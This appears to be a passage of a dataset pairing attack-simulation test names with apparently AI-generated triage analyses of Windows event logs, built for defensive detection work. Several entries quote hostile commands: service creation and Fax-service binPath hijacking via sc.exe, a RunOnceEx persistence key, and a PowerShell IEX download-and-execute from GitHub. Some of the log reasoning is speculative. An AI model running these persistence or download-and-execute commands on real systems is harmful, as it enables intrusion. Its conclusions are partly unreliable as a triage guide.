- **MALICIOUS**: The log entries clearly depict malicious activities, with PowerShell being used to execute potentially harmful scripts downloaded from an unverified external source. Immediate intervention is necessary.

### Guidance on How to Proceed

1. **Isolate the Affected System**: Immediately disconnect the host `Server002` from the network to prevent any potential spread of malicious activity.
   
2. **Conduct a Thorough Investigation**:
   - Utilize a forensic image of the affected system to trace the entry point and assess the full extent of the compromise.
   - Analyze network logs to identify any connections the compromised system has initiated, especially focusing on the time around the suspicious PowerShell executions.

3. **Revoke and Reset Credentials**: Investigate access logs further to determine if credentials have been compromised. Reset passwords for any potentially affected accounts and ensure MFA is enabled for critical accounts.

4. **Patch and Harden the Environment**: Ensure all systems on the network are fully patched against known vulnerabilities, and evaluate system configurations to enhance security postures, such as restricting PowerShell executions.

5. **Educate Users and Alert for Future Incidents**: Brief users on phishing and proper security protocols, as well as encourage them to report any suspicious activity immediately for prompt action. Implement further logging and monitoring to capture similar anomalous behaviors in the future.

By addressing these concerns, the organization can mitigate the current threat and strengthen its defenses against potential future incidents."
Reg Key RunOnce,"After carefully analyzing the provided Windows event logs, the following observations were made:

### Key Observations:

1. **Time Change Event:**
   - Multiple instances of Event ID 4616 and Event ID 1 (Kernel-General) indicate that the system time was changed. The `svchost.exe` process is associated with this change.
   - These changes might appear suspicious because unauthorized changes to system time can be a sign of tampering, potentially to bypass security logs or time-based permissions.

2. **Process Execution:**
   - There are various legitimate processes such as `svchost.exe`, `whoami.exe`, and standard Windows services running. However, their behavior and sequence do not appear malicious.
   - Several instances of `conhost.exe` are seen following processes like `whoami.exe`, which is typical and not inherently suspicious.

3. **Registry Modification Attempt:**
   - A command executed from `cmd.exe` was detected that tries to modify the registry (adding a registries entry at `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend`). This is often indicative of persistence mechanisms used by malware.
   - The command-line execution by `reg.exe` under the `SERVER002\admin_test` user account emphasizes this suspicion and warrants further investigation.

4. **Edge Update Activity:**
   - Significant activity is from Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`). These events include installing updates and registering COM components, which are typical for browser updates.
   - All Edge update events are executed by the `NT AUTHORITY\SYSTEM` user, which is expected for system-level services.

5. **Network Service Activities:**
   - The `sppsvc.exe` (Software Protection Platform Service) is running under `NT AUTHORITY\NETWORK SERVICE`, which aligns with its expected behavior to manage Microsoft software licenses.

### Assessment:

- **Suspicious Activity:** The registry modification attempt, particularly the addition to `RunOnceEx`, is the primary indicator of suspicious behavior. Such changes are commonly associated with malware persistence strategies.
- **Potential Benign Activity:** The frequent Microsoft Edge Update events might be typical for software update processes and is not necessarily malicious.

### Resolution:

- **Resolution:** SUSPICIOUS

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Investigate the source of the registry modification attempt.
   - Check user activity logs for `SERVER002\admin_test` to see why the registry entry was added.

2. **Further Investigation:**
   - Review any additional logs or system changes around the modification event to identify associated artifacts like new file creation or network connections.
   - Double-check the system time change events for legitimacy, ensuring it aligns with regular system settings adjustments.

3. **Preventive Measures:**
   - Implement alerts for registry changes to detect future unauthorized modifications.
   - Conduct a comprehensive security review of the affected system to ensure no other malicious activity persists.

In summary, while numerous activities appear benign and related to system maintenance, the registry modification event requires deeper investigation to rule out compromise or planned administrative changes."
EXO - Full access mailbox permission granted to a user,"### Detailed Log Analysis

#### Windows PowerShell Log Analysis
- **Event 1094-1102**: These logs indicate the execution of a PowerShell script on `Server002`. The script imports the `ExchangeOnlineManagement` module, performs credential operations, connects to Exchange Online with specified credentials, adds mailbox permissions granting full access to a delegate, and then disconnects. 
  - **Indicators of Concern**: 
    - Storing and using a plain text password (`o365_password_test`) is a potential security risk, as it suggests weak security practices.
    - The activity of directly accessing and modifying mailbox permissions can indicate malicious behavior if not authorized or expected.
    - PowerShell script that modifies permissions could potentially be used for privilege escalation or maintaining persistence if configured maliciously.

#### Sysmon Log Analysis
- **Events 18016-18047**: The Sysmon logs primarily show various system process activities, like execution of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `svchost.exe`, most processes are executed by the user `SERVER002\\admin_test` and `NT AUTHORITY\\SYSTEM`.
  - **Indicators of Concern**:
    - The frequent execution of `wevtutil.exe` and `conhost.exe` in a short time span may point to log manipulation or other administrative tasks.
    - `whoami.exe` is often used to check user privileges, which can be part of reconnaissance or privilege verification in an attack chain.
    - Execution of PowerShell with specific command lines indicative of further operations into email systems and potential misuses.
    - The occurrence of potentially unnecessary `svchost.exe` processes might be benign but requires further context like what specific services they were hosting.

### Assessment
- There is no indication of a compromise in terms of unauthorized external access or persistence mechanisms visible in the provided logs. However, the manipulation of mailbox permissions using credentials within a script warrants further scrutiny.
- The plain text password handling hints at poor security practice, and permission changes without corroboration with legitimate need could be suspicious.
- Overall, there are signs that could point to misuse by an authorized insider or improper configuration rather than evidence of an externally orchestrated malicious attack.

### Resolution
- **SUSPICIOUS**: Given the potential insider risk and improper handling of security credentials, further investigation is warranted. This includes:
  - Verifying the legitimacy and purpose of the PowerShell script execution.
  - Ensuring that the credentials and permissions align with company policy and security practices.
  - Conducting interviews with the involved users and securing access logs for verification.
  - Checking for any alerts or detections from endpoint security solutions that could corroborate these findings.

### Guidance
- Conduct a comprehensive review of user activities, especially those with administrator privileges.
- Review related mailbox access logs and permissions to ensure no unauthorized changes persist.
- Implement or reinforce policies regarding credential handling, especially avoiding plain text storage.
- Monitor for any similar activities and ensure a rapid response capability is in place for any potential anomalies detected in the future."
Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs,"Upon investigation of the provided event logs, here is the detailed analysis based on the Sysmon, System, Windows PowerShell, and Security logs:

### Sysmon Log Analysis:
1. **Repeated Execution of wevtutil.exe:**
   - We observe multiple instances of `wevtutil.exe` being executed by the user `SERVER002\\admin_test`. `wevtutil.exe` is a legitimate Windows tool used for event log queries and exporting, but frequent and automated use can indicate that logs are being exported or cleared, which can be a sign of malicious activity (e.g., covering tracks).
  
2. **Use of conhost.exe:**
   - Similarly, multiple instances of `conhost.exe` are coupled right after `wevtutil.exe` executions. `conhost.exe` is a standard Console Host process, which in frequent execution following `wevtutil.exe`, may indicate a scripted or automated process.

3. **Execution of PowerShell:**
   - PowerShell is executed with unusual command-line arguments pointing to executable `CreateProcessWithPipe.exe` from a temporary directory. This directory and executable structure suggests possible staging or post-exploitation activities.

4. **Execution of werfault.exe:**
   - `werfault.exe` associated with debugging channel in PowerShell indicates offensive tactics potentially related to capturing or redirecting error reporting, incorporating into a malicious act.

### Windows PowerShell Log Analysis:
- Reflects the execution of PowerShell with custom scripts or binaries, matching Sysmon findings. This ongoing PowerShell activity leverages `CreateProcessWithPipe.exe` pointing towards payload execution or other administrative scriptings, common in malicious intent.

### System Log Analysis:
- Logs show a system time jump, indicating potential Time Manipulation (`EventID: 4616`). While time adjustments can be legitimate (time sync), combined with other findings, it might imply deceit for altering timestamp perception in logs.

### Security Log Analysis:
- The observed change in system time (matching System logs), highlights a common trick used to confuse time-based log correlation. Given the pattern and context, this can signal deception tactics in action.
  
### Final Assessment:
Considering the repeated `wevtutil.exe` executions, use of PowerShell with suspect executable paths, combined with consistent time manipulation detected (a known tactic to mislead log audits), the activities captured within the logs strongly align with malicious activity patterns.

### Resolution:
**MALICIOUS** - The logs indicate a clear sign of potential compromise, involving event log manipulation, PowerShell exploitation, and time distortion.

### Guidance:
- Immediate containment should involve isolating the affected host to prevent further escalation.
- Conduct comprehensive forensic analysis to identify compromised paths, data accessed, and any additional payloads executed.
- Validate integrity and security of all managed credentials with a focus on the user account `admin_test`.
- Review and enhance monitoring configurations especially around PowerShell, Process execution, and time-change activities.
- Consider deploying enhanced security measures, such as restricting access to sysinternals and ensuring PowerShell is logged aggressively under strict policies."
Service Installation CMD,"Let's conduct a detailed analysis of the provided Windows event logs, focusing on potential indicators of compromise.

### Analysis:

1. **Profile of the Logs**:
   - The logs provided primarily include Sysmon, System, and Application event logs.
   - The majority of processes are executed under the user `SERVER002\admin_test`.

2. **Suspicious Process Creation and Execution**:
   - A service named `fileTestService_CMD` is created using `sc.exe`. The command executed via `cmd.exe` is:
     ```
     ""cmd.exe"" /c sc.exe create fileTestService_CMD binPath= ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe"" start=auto type=Own & sc.exe start fileTestService_CMD
     ```
   - The location of the executable `fileService.exe` under a temporary path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin` is unusual, especially for services, which often reside in protected system directories. This could suggest a non-standard or unauthorized service.

3. **Privilege Context**:
   - The service `fileTestService_CMD` is set to run under the `LocalSystem` account, granting it high privileges which could be exploited if it is not a legitimate service.

4. **Process Relationships**:
   - Processes such as `PowerShell.exe`, `wevtutil.exe`, and various instances of `conhost.exe` are observed executing very closely in time. 
   - The `PowerShell.exe` execution does not show any command-line arguments, which by itself isn't immediately suspicious but can be suspicious if seen in context with other known malicious activities.

5. **Event Log Analysis**:
   - The `Service Control Manager` log (Event ID 7045) indicates that a new service has been installed, further confirming that the execution path of `fileService.exe` is being registered as a service. This Action without appropriate justification often indicates a persistence mechanism introduced by malware.

6. **Other Executions**:
   - Common processes such as `whoami.exe` and `hostname.exe` are logged, which is typical for information gathering on a system and might be used in reconnaissance activity.

7. **Benign Activities**:
   - Microsoft Edge Update activities are logged, which appear typical and include service stopping and starting consistent with normal update procedures.

### Assessment:

The presence of the `fileTestService_CMD` service being created and executed from an atypical directory (a Temp folder) with auto-start capabilities on `LocalSystem` privileges is an indicator that raises significant suspicion. This process arrangement is often associated with attempts to maintain persistence through a non-standard service mechanism, suggesting potential malicious intent.

### Resolution:

Based on the analysis above, the activity detailed in the logs should be marked as **SUSPICIOUS**. Further investigation is warranted to verify if `fileService.exe` in the given context is authorized or benign software possibly being misused, or potentially malware trying to escalate privilege and persist on the system.

**Guidance for Further Action**:
- Isolate the host from the network to prevent any potential spread of malware or data exfiltration.
- Analyze `fileService.exe` for known malware signatures, behavioral analysis, or forensic analysis to determine its legitimacy.
- Conduct user interviews and gather evidence if this installation was intentional.
- Monitor further for any outbound connections or UUID-lookups appearing unusual.
- Examine other systems in the environment for similar activities, especially focusing on usage of admin accounts and services that don't map to known baselines in IT asset management or configuration management databases."
Process Hollowing using PowerShell,"Based on the provided logs, here is a detailed analysis:

### Security Log Analysis:

1. **Event 4634**: Signifies a logoff event for the user admin_test. The LogonType 3 indicates a network logon, which is typically used for accessing shared resources.
   
2. **Event 4672**: Indicates a special privileges assignment (SeSecurityPrivilege, SeBackupPrivilege, etc.) to admin_test. Privileges such as SeDebugPrivilege can be concerning as they allow for debugging processes and may be exploited by attackers. 

3. **Event 4624**: Represents a successful logon for admin_test using NTLM authentication. The repeated use and assignment of elevated privileges right after a logon could indicate privilege escalation or logging on with a deliberately high privilege context.

### Sysmon Log Analysis:

1. **Multiple Uses of `wevtutil.exe`**: This is a legitimate Windows tool used to manage event logs. However, its frequent execution and the close timestamps suggest an attempt to potentially clear or alter logs.

2. **`conhost.exe` and `hostname.exe`**: These are standard Windows executables. Their execution, coupled with others, such as `wevtutil.exe`, in a sequence might suggest some form of script-based automation or misused legitimate processes.

3. **`whoami.exe`**: Used to display the user information of the current logon session, indicates a possible need to verify access or permissions.

4. **PowerShell Script Execution**: 
   - **`Start-Hollow.ps1` execution**: The script `Start-Hollow.ps1` located in a temp directory executes with parameters indicating a potential process hollowing technique. This involves using a benign application's process (notepad.exe) to execute malicious code (cmd.exe), potentially without detection.

### Windows PowerShell Log Analysis:

- Repeated entries consistent with the execution of a PowerShell script, suggesting the execution of `Start-Hollow.ps1`. The importance here lies in the context provided by the command line details, which indicate a suspicious process manipulation activity.

### Conclusion:
The evidence from the logs suggests potential malicious activity:

- The use of privileged accounts with elevated permissions together with NTLM logons.
- Suspicious repeated execution of `wevtutil.exe` could suggest log tampering or cover-up attempts.
- The execution of `Start-Hollow.ps1` with parameters indicative of process hollowing is a common malware technique.

### Resolution:
- **MALICIOUS**: The activities recorded in the logs, especially the process hollowing attempt using a PowerShell script, clearly indicate malicious intent. There is a high risk of system compromise.

### Guidance:
- Immediately isolate the affected system from the network to prevent further compromise.
- Conduct a comprehensive malware scan and forensic investigation on the affected system.
- Review and potentially change credentials for the impacted admin accounts.
- Audit and tighten permissions around PowerShell execution policies and privilege assignments on the network.
- Consider implementing further logging, monitoring, and alerting to detect and respond to similar threats."
Remote Process Injection with Go using RtlCreateUserThread WinAPI,"Upon reviewing the presented logs from the Windows machine 'Server002', the following observations are made:

### System Log:
1. **Time Changes:** Event IDs 24 and 1 from ""Microsoft-Windows-Kernel-General"" indicate changes to system time. The adjustments note the 'OldTime' being later than 'NewTime'. This can be a sign of a time manipulation attempt, which sometimes is used in conjunction with malicious activities. However, given there is no clear continuation of this or supporting evidence of malicious activity directly correlating, it alone isn't strongly indicative.

### Windows PowerShell Log:
1. **PowerShell Command Execution:** There is a notable PowerShell command that involves using `Start-Process` to start `werfault.exe` and subsequently launching `RtlCreateUserThread.exe` with debug privileges. This behavior is suspicious as:
   - `werfault.exe` is typically used for Windows Error Reporting and may be utilized here to mask other activities.
   - Launching custom executables from a temporary directory with potentially higher privileges ('-debug') might indicate an attempt to escalate or perform unauthorized actions.
   - Usage of `RtlCreateUserThread` is associated with lower-level control typically employed in exploits or to manipulate processes. 

### Sysmon Log:
1. **Frequent Utility Usage:** Commands such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are used frequently by the user `SERVER002\admin_test`. Although they might depict administrative activities, the context of their execution following possibly questionable PowerShell scripts adds to the suspicion.
2. **Execution of WerFault:** The appearance of `WerFault.exe` in the Sysmon logs following the PowerShell logs adds to the indications that this execution path may not be typical and might be used to mask other activities.

### Security Log:
1. **Privileged Access:** User `admin_test` logged in with numerous high privileges, including `SeDebugPrivilege`. These are typically needed for in-depth system access and could indicate legitimate administration but when paired with other signs could also hint at privilege abuse.

### Conclusion:
Combining the unusual PowerShell execution, the time adjustments, and administrator login with extensive privileges, we find several elements indicating potentially suspicious behavior rather than definitive malicious activities. The PowerShell execution stands out the most due to its nature and potential intent.

### Resolution:
- **SUSPICIOUS**: The logs present activities that warrant deeper investigation. The PowerShell command leveraging `werfault.exe` and `RtlCreateUserThread.exe` is particularly concerning and should be explored with further process analysis, file integrity checks, and a review of network traffic from the time of these logs.
  
### Suggested Next Steps:
1. **Conduct a memory analysis** of the host to detect any running processes that do not match the usual baseline.
2. **Review network logs** and correlate outbound connections initiated around the time of PowerShell execution.
3. **Inspect file integrity** of introduced executables like `RtlCreateUserThread.exe` and check hashes against known malicious patterns.
4. **Assess persistence mechanisms** by checking scheduled tasks, startup items, and registry modifications.
5. If equipped, deploy a behavioral-based EDR solution to observe post-execution behaviors across other systems for related activities."
Portable Executable Injection,"Upon reviewing the event logs provided, the following analysis was conducted:

### Indicators of Malicious Activity:

1. **PowerShell Execution (Windows PowerShell Log):**
   - A PowerShell script is executed with the command line: 
     ```
     powershell.exe & {Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\RedInjection.exe""; Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force}
     ```
   - The PowerShell script attempts to execute a suspicious executable ""RedInjection.exe"" located in a temporary directory, which is a common behavior for malware execution.
   - The presence of the command to stop Notepad processes using `Stop-Process -Force` is aggressive and indicates potentially malicious intent.

2. **Sysmon Logs:**
   - The Sysmon logs show the creation of the ""RedInjection.exe"" process, confirming its execution.
   - The ""RedInjection.exe"" process spawns a series of child processes including Notepad, which aligns with the PowerShell script’s command sequence.
   - The executable ""RedInjection.exe"" is not a known system file, and its execution from a user profile temp directory without a recognized company or product association strongly indicates malicious activity.

3. **Privilege Escalation:**
   - Security logs show the user ""admin_test"" being granted a range of high-level privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege), which are typically unnecessary for routine tasks but useful for malicious activities like process manipulation or code injection.

### Assessment and Conclusion:

The logs present strong indicators of malicious activity:
- The execution of ""RedInjection.exe"" via PowerShell from a temporary directory, which is not standard for legitimate software.
- Use of aggressive PowerShell commands to manage processes forcefully.
- High-level privileges granted to the user ""admin_test” without clear justification, which could be used to fortify malicious operations.

The combination of these factors typically indicates that an unauthorized party may have compromised the system to run potentially harmful software.

### Resolution: MALICIOUS

**Guidance:**
- Immediate containment is advised. Disconnect the affected host from the network to prevent further spread or data exfiltration.
- Examine the ""RedInjection.exe"" file and its behavior using a secure, isolated environment.
- Review access logs and monitor network traffic for further indicators of compromise.
- Conduct a thorough forensic analysis to understand the entry point and scope of the breach.
- Remediation should include patching up any security vulnerabilities and reviewing user privileges to prevent potential abuse in the future."
Domain Account and Group Manipulate,"Upon reviewing the logs provided, several key points indicate potential malicious activity:

1. **PowerShell Command Execution**: 
   - A PowerShell command was executed with the intent to create a new Active Directory user account and subsequently add that account to the ""Domain Admins"" group. 
   - The command includes the generation of random elements within the account name, which is characteristic of trying to obfuscate or randomize usernames to avoid detections or audits.
   - This activity is critical because adding a user to a high-privilege group like ""Domain Admins"" suggests an attempt to escalate privileges and possibly maintain persistence within the environment.

2. **Execution of `wevtutil.exe`**:
   - The frequent execution of `wevtutil.exe` alongside PowerShell in a short period suggests manipulation of event logs, which is a tactic sometimes used by attackers to cover tracks.

3. **Integrity Level and Execution Contexts**:
   - The activities are executed under a high integrity level and often under the user context of `NT AUTHORITY\SYSTEM` or `SERVER002\admin_test`, indicating that the actor has administrative-level access on `Server002`.

4. **System and Security Logs**:
   - Logon events and service control operations (e.g., via `sc.exe`) appear normal at a glance but combined with the contextual PowerShell activities, might indicate changes or attempted disruptions in operations.

5. **Usage of Common Windows Utilities like `whoami.exe` and `hostname.exe`**:
   - Used possibly to verify user context and environment without leaving more verbose indicators. Such usage combined with high integrity levels can suggest reconnaissance activities.

6. **No Significant Anomalies in Security Logs**:
   - From a security viewpoint, the logs show no unusual authorization failures or unprecedented service operations outside of those expected within a working Windows server environment if the aforementioned PowerShell activity occurred under a legitimate administrative task.

Based on the activities observed, especially the PowerShell command intended to create and add a user to the ""Domain Admins"" group, which is a direct indicator of privilege escalation attempts, the resolution for these logs is:

**MALICIOUS**

**Guidance on Proceeding**:
- Immediately review and halt any suspicious user accounts or changes in the ""Domain Admins"" group.
- Conduct a full security audit of `Server002` to identify any irregular access patterns since the potential privilege escalation.
- Strengthen monitoring and alerting mechanisms for unusual PowerShell commands and executions, especially those targeting high-privilege roles.
- Review and possibly revert any recent changes to system configurations or accounts until all systems are confirmed safe.
- Consider consulting with an incident response team to mitigate potential security breaches and prevent further unauthorized access."
UUID custom process Injection,"## Analysis

### PowerShell Log
- Multiple PowerShell events logged with a suspicious activity pattern. The command ""Start-Process 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\uuid_injection.exe'"" suggests execution of a potentially malicious executable from a temp path, a common tactic used by malware to evade detection. 
- Anomalous chain of commands using cmdlet `Start-Process` to invoke 'uuid_injection.exe', `Start-Sleep`, and `Stop-Process` targeting 'Notepad.exe' could indicate attempts to create or stop processes after interfering with legitimate applications.
- Usage of PowerShell to execute binaries directly from temporary directories is often a red flag pointing towards malicious activity.

### Sysmon Log
- Process creation logs illustrate the execution of ""uuid_injection.exe"" from a suspicious temporary path, indicating possible unauthorized code execution.
- The presence and execution traces of ""wevtutil.exe"" and ""conhost.exe"" around the same time frame might point towards environment manipulation and attempts to clear logs.
- Process lineage from PowerShell -> uuid_injection.exe further reinforces the suspicion of scripted actions running potentially harmful binaries.
- Several legitimate processes running as SYSTEM, e.g., ""CompatTelRunner.exe"", ""MusNotification.exe"", suggest typical system operations, but their timestamps coincide with suspicious script execution times.

### Security Log
- Logs show system-level operations with privileged users like 'SYSTEM,' which may appear normal but coincide with potentially unauthorized activities.
- A pattern of logon events (4624, 4672) authenticating SYSTEM-level operations might be typical for routine administrative tasks or scripted processes running as SYSTEM.
- Event 5379 showing credential operations and errors could signal potential attempts to access or authenticate using cached or unauthorized credentials.

### Application Log
- No unexpected activity detected; logs indicate typical Windows Defender activity.

## Conclusion

Based on the provided logs:
1. **PowerShell Activity**: The execution of `uuid_injection.exe` from a temporary directory using PowerShell is typically concerning, indicative of a potential compromise.
2. **File Executions**: The temporary path execution strategy is aligned with known threat actor behavior aiming at initial access or persistence.
3. **System Tools Usage**: Events surrounding system tools like `wevtutil.exe` potentially clearing logs.

Given the observed behavior, these logs represent potential unauthorized activity intended to mask malicious actions and disrupt or tamper normal processes. None of the activities entirely confirms an advanced persistent threat (APT) without further secondary indicators; however, the nature of the actions altogether indicates enough suspiciousness.

## Final Resolution
- **Resolution: MALICIOUS**
  
### Actions Recommended:
1. **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent potential lateral movement.
2. **Thorough Investigation**: Perform a full system malware scan, focusing on transient directories.
3. **Log Review**: Ensure integrity and collect further comprehensive logs across affected systems and monitor closely for any new eviction attempts.
4. **Remediation**: Engage in incident response procedures, removing any unauthorized executables and scrutinize access permissions and user activities.

This assessment should be corroborated with further threat intelligence to confirm diagnosis and refine detection rules moving forward."
Azure AD - adding service principal to Azure AD role,"Upon analyzing the provided Windows event logs across various categories, here's what stands out:

1. **Use of Windows PowerShell**:
   - There are multiple instances of PowerShell execution with complex scripts. Specifically, there's a script involving Azure AD where login credentials for a user ""jonh@contoso.com"" are being generated and used. This script is organized to import required modules, create credentials using `ConvertTo-SecureString` with a plain-text password, and connect to Azure AD. It manipulates directory roles and service principals. The use of PowerShell with such commands often indicates automation for administrative tasks, but it is also commonly used in malicious pursuits due to its powerful capabilities.

2. **Command-Line Details**:
   - The PowerShell command-line execution observed is well-structured for an automation task, potentially legitimate in a development or system maintenance scenario. However, the manual or unsanctioned use of credentials in scripts—particularly the use of a plain-text password (even temporarily)—is generally considered a security risk or bad practice.

3. **Process Executions**:
   - Several processes like `hostname.exe`, `whoami.exe`, and various instances of `conhost.exe` have been executed. These are legitimate Windows processes. However, their association with scripts (possibly as debugging or information-gathering steps) is noteworthy but not immediately indicative of malicious activity unless corroborated with suspicious network or file activity.

4. **User Context and Privileges**:
   - Most of the actions are conducted under a user with administrative privileges (`SERVER002\\admin_test`), which inherently carries risk if exploited by a malicious actor.

5. **Event Timelines**:
   - The sequence of events seems systematic and coordinated within a narrow timeframe, suggesting the possibility of an automated task.

6. **Software Protection Platform Service**:
   - Events from this service seem routine and do not independently indicate any malicious behavior.

Given these observations, the primary activity raising concern is the execution of PowerShell scripts manipulating Azure AD objects with embedded credentials. While such scripts can be part of automated IT administrative tasks or legitimate software deployment processes, they also present potential security exposure if unsanctioned or improperly managed.

**Resolution: SUSPICIOUS**

- **Analysis Conclusion**: The behavior captured in the event logs could be corroborated with legitimate administrative tasks within an IT environment. However, due to the presence of hardcoded credentials and the types of operations conducted via PowerShell, there is potential for misuse or exploitation by unauthorized parties.
- **Recommendation**: Conduct further investigation into the origin and authorization of the PowerShell script execution. Verify if the Azure AD modifications are expected and align with sanctioned IT tasks. Enhance monitoring and control around the use of PowerShell scripts, and consider using secure methods for handling credentials, such as environment variables or secure vaults."
Domain Password Policy Check: Only Two Character Classes,"Based on the logs provided, let's break down the analysis:

1. **Application Logs:**
   - The Windows Defender service is running (`SECURITY_PRODUCT_STATE_ON`), which is generally a good sign as it indicates that Windows Defender is active and monitoring for threats.

2. **PowerShell Logs:**
   - The PowerShell scripts executed contain operations related to credential management. They attempt to read a credentials file, compare passwords, and change passwords. This behavior is typically legitimate in maintenance scenarios, such as routine password updates.
   - However, since the script involves credential files and password changes, it should be verified whether these actions were performed legitimately by checking if the user/admin has scheduled such automation.

3. **Security and Sysmon Logs:**
   - There are numerous successful logins (EventID 4624) and special privilege assignments (EventID 4672) to the `SYSTEM` account, which are typical of normal system operations.
   - Repeated instances of process creations involving standard Windows components such as `conhost.exe`, `CompatTelRunner.exe`, `devicecensus.exe`, `rundll32.exe`, and others are observed. These are common Windows processes, usually considered benign if unmodified.
   - A significant amount of credential enumeration (EventID 4798) is occurring. The enumeration was initiated by the process `taskhostw.exe`. This could be normal, as during start-up or administrative tasks, Windows often queries user accounts.
   - The use of Sysmon logs shows processes such as `HOSTNAME.EXE`, `whoami.exe`, `CompatTelRunner.exe`, and `SecurityHealthService.exe` are executed with legitimate purposes. The activity and the files being used seem to be the default Microsoft executables, so normally benign.
   - The Sysmon logs also indicate normal use of `Windows PowerShell`, reiterating that careful examination of what the PowerShell is executing should be verified against legitimate administrative tasks.

4. **Potential Areas of Concern:**
   - The PowerShell script handles credentials and password changes automatically. If the involved `credFile` path and process are not part of known operations or procedures, then it might need closer scrutiny, especially ensuring that this is not a script injected with malicious intent.
   - The consistent process of `taskhostw.exe` querying user information might raise a flag if further correlated activities like privilege escalation or unexpected tasks are scheduled but without such context, it can be routine Windows behavior.

**Overall Assessment:**
After a detailed assessment of the logs, there doesn't seem to be definitive evidence pointing towards overtly malicious activities. However, given the sensitivity of operations involving credential management via PowerShell, and enumeration of user accounts, it is prudent to carefully verify the legitimacy of these scripts and operations.

**Resolution:** 
- **SUSPICIOUS** - The credential management script and enumeration activities should be verified against expected IT operations or administrative tasks. Ensure that such scripts align with authorized activities, and if they are unfamiliar, further investigation into the source and authorization of these scripts is recommended."
PowerShell Registry RunOnce,"After a detailed analysis of the provided Windows event logs, here is the assessment of suspicious or malicious activities:

1. **Security Logs**:
   - Event ID 4624 (Successful Logon) and 4672 (Special Privileges Assigned to New Logon) indicate frequent logon and privilege assignment to the user ""admin_test"" using NTLM authentication and Logon Type 3, which indicates a network logon, potentially a Remote Desktop or SMB logon.
   - The user ""admin_test"" consistently receives high privileges, including SeDebugPrivilege, SeTakeOwnershipPrivilege, and others, which are typically considered sensitive and are often linked with administrative duties.

2. **Sysmon Logs**:
   - The execution of `whoami.exe`, `hostname.exe`, and `PowerShell.exe` by the user ""admin_test"" might not be alarming by themselves, but the context in which they occur can be suspicious.
   - The PowerShell script attempts to download and execute a script from GitHub using an obfuscated command (`IEX (New-Object Net.WebClient).DownloadString(...)`). This behavior is often associated with malware or unauthorized remote administration tools.

3. **Windows PowerShell Logs**:
   - There is a clear log indicating PowerShell being used to execute a potentially harmful script from an external source (`https://github.com/file/file-file/raw/master/files/data.001/src/Discovery.bat`). This execution is suspicious and is generally indicative of script-based attacks like fileless malware.

4. **Application Logs**:
   - Edge update events and software protection events appear normal and consistent with typical update and maintenance activities. 

5. **System Logs**:
   - No significant suspicious activities detected in the system log entries provided.

### Conclusion:
The combination of high privilege assignment and the use of PowerShell to download and execute potentially harmful external scripts are strong indicators of malicious activity.

### Resolution:
**MALICIOUS** - The logs demonstrate signatures typical of malicious activities, particularly the PowerShell command usage which is designed to download and execute scripts from an external source without clear authorization.

### Guidance:
1. **Immediate Action**: Isolate the compromised host to prevent further spread of any potential infection or data exfiltration.
2. **Forensic Investigation**: Conduct a thorough forensic analysis to identify further indicators of compromise, and seek out any other scripts or executables that may have been downloaded or executed.
3. **Review Privileges**: Re-assess and tighten the privilege levels assigned to user accounts like ""admin_test"" to adhere to the principle of least privilege.
4. **Enhance Monitoring and Detection**: Implement strict monitoring and rules for script executions and privilege assignments, especially for PowerShell and remote script execution, to prevent future incidents."
Modify BootExecute Value,"Upon analyzing the provided Windows event logs, the following observations were made:

### Windows PowerShell Logs:
1. The logs indicate repeated execution of a PowerShell script involved in backing up a registry key (`Session Manager`) and altering the `BootExecute` registry value. This script checks if the backup file exists and creates it if necessary, using `reg.exe` and `Set-ItemProperty`.
2. The action to modify the `BootExecute` value could potentially alter system behavior during boot, a common technique used in persistence or system manipulation.

### Security Logs:
1. The audit change event (EventID: 4616) indicates the `svchost.exe` process running under the `LOCAL SERVICE` account adjusted the system time. This action, while not inherently malicious, can be concerning if done without authorization as it can obscure malicious activity.

### Sysmon Logs:
1. Multiple instances of processes `wevtutil.exe` and `conhost.exe` executed by the `admin_test` user. These utilities are standard Windows tools but can be utilized for managing and queuing event logs or hosting command windows.
2. Execution of `hostname.exe` and `whoami.exe`, both legitimate commands that query system information, could be part of routine operations or reconnaissance activity.
3. A PowerShell process executed a script consistent with the Windows PowerShell log using high integrity, indicating administrative execution.

### Application and System Logs:
1. Logs related to Microsoft Edge Update suggest regular updates are occurring. Multiple instances of the `MicrosoftEdgeUpdate.exe` and related processes such as `MicrosoftEdgeUpdateSetup.exe` executed, indicating either an update cycle or potential misuse.

### Assessment:
- **PowerShell Activity**: The script's behavior warrants concern due to its registry manipulations. The actions could suggest system tampering or preparation for persistence techniques.
- **Registry and Boot Configuration Changes**: Altering the `BootExecute` value could be legitimate depending on context; however, without verifying intention and origin, it could suggest unauthorized changes.
- **Time Change**: The system time modification using `svchost.exe` could indicate potential obfuscation of activities if performed without prior knowledge or legitimate need.

### Resolution:
Given the evidence and potential risks associated with registry modifications, particularly to the `BootExecute` setting, combined with altering system time which can mask activity patterns, the conclusion is:

- **SUSPICIOUS** - The activity in the logs does not conclusively confirm malicious behavior, but there are several indicators that warrant further investigation, notably the registry changes, PowerShell script execution context, and time modifications. Further forensic analysis and context from system owners would be necessary to determine legitimacy or compromise.

### Guidance:
- Investigate the origin and purpose of the PowerShell script to establish whether it is authorized.
- Verify recent system changes, particularly related to boot configurations in the registry.
- Confirm if the time changes match legitimate activities or administrative tasks.
- Monitor for recurring or related activity indicative of reconnaissance or further system manipulation."
Modify Fax service to run PowerShell,"### Analysis:

Upon analyzing the provided logs, several activities can be identified:

1. **Sysmon Logs:**
   - Multiple executions of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `poweshell.exe`.
   - The command line for `cmd.exe` shows a suspicious configuration of the `Fax` service with the ""binPath"" pointing to PowerShell execution: 
     ```
     ""cmd.exe"" /c sc config Fax binPath= ""C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \""write-host 'data.003 Test'\""""
